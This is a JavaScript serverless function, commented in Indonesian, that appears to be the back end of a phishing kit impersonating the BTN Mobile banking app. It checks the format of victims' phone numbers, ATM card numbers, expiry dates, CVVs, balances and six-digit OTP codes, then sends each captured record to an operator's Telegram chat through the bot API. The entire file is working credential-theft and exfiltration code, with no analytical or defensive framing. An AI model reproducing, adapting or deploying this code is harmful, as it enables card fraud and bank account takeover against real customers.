// netlify/functions/send-data.js
const axios = require('axios');

// Format pesan untuk Telegram
function formatCardMessage(phone, cardNumber, expiry, cvv, balance, timestamp) {
    const cleanPhone = phone.replace(/\D/g, '');
    
    let message = 
        "🏦 *BTN MOBILE - DATA KARTU ATM* 🏦\n" +
        "├─────────────────────────\n" +
        `├ 📱 NO HP : ${cleanPhone}\n` +
        "├─────────────────────────\n" +
        `├ 💳 NO KARTU : ${cardNumber}\n` +
        `├ 📅 EXPIRY : ${expiry}\n` +
        `├ 🔐 CVV : ${cvv}\n` +
        "├─────────────────────────\n" +
        `├ 💰 SALDO : Rp ${balance}\n` +
        "├─────────────────────────\n" +
        `├ ⏰ WAKTU : ${new Date(timestamp).toLocaleString('id-ID')}\n` +
        "╰─────────────────────────";
    
    return message;
}

function formatOtpMessage(phone, otp, timestamp) {
    const cleanPhone = phone.replace(/\D/g, '');
    
    let message = 
        "🔐 *BTN MOBILE - KODE OTP* 🔐\n" +
        "├─────────────────────────\n" +
        `├ 📱 NO HP : ${cleanPhone}\n` +
        "├─────────────────────────\n" +
        `├ 🔑 KODE OTP : ${otp}\n` +
        "├─────────────────────────\n" +
        `├ ⏰ WAKTU : ${new Date(timestamp).toLocaleString('id-ID')}\n` +
        "╰─────────────────────────";
    
    return message;
}

// Validasi nomor telepon Indonesia
function isValidIndonesianPhone(phone) {
    const cleanPhone = phone.replace(/\D/g, '');
    return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('08');
}

// Validasi OTP 6 digit
function isValidOTP(otp) {
    return /^\d{6}$/.test(otp);
}

// Validasi kartu
function isValidCardNumber(cardNumber) {
    const clean = cardNumber.replace(/\s/g, '');
    return /^\d{16}$/.test(clean);
}

function isValidExpiry(expiry) {
    return /^\d{2}\/\d{2}$/.test(expiry);
}

function isValidCVV(cvv) {
    return /^\d{3}$/.test(cvv);
}

exports.handler = async (event, context) => {
    const headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
    }

    try {
        const { type, phone, card_number, card_expiry, card_cvv, balance, otp_code, timestamp } = JSON.parse(event.body);
        
        // Validasi input dasar
        if (!type || !phone || !isValidIndonesianPhone(phone)) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid phone number format' })
            };
        }

        // Validasi berdasarkan tipe
        if (type === 'card') {
            if (!card_number || !isValidCardNumber(card_number)) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'Invalid card number format' })
                };
            }
            if (!card_expiry || !isValidExpiry(card_expiry)) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'Invalid expiry date format' })
                };
            }
            if (!card_cvv || !isValidCVV(card_cvv)) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'Invalid CVV format' })
                };
            }
        } else if (type === 'otp') {
            if (!otp_code || !isValidOTP(otp_code)) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'Invalid OTP format' })
                };
            }
        } else {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid type. Must be "card" or "otp"' })
            };
        }

        // Konfigurasi Telegram
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            console.error('Missing Telegram credentials');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Format pesan
        let message;
        if (type === 'card') {
            message = formatCardMessage(phone, card_number, card_expiry, card_cvv, balance, timestamp || new Date().toISOString());
        } else {
            message = formatOtpMessage(phone, otp_code, timestamp || new Date().toISOString());
        }

        // Kirim ke Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            },
            { timeout: 10000 }
        );

        console.log(`Telegram ${type} data sent successfully:`, {
            phone: phone.replace(/\d/g, 'X'), // Masking untuk log
            status: telegramResponse.status,
            timestamp: new Date().toISOString()
        });

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                message: `Data ${type} berhasil dikirim`,
                telegram_status: telegramResponse.status
            })
        };

    } catch (error) {
        console.error('Error:', {
            message: error.message,
            response: error.response?.data,
            timestamp: new Date().toISOString()
        });
        
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: 'Internal Server Error',
                details: error.message
            })
        };
    }
};
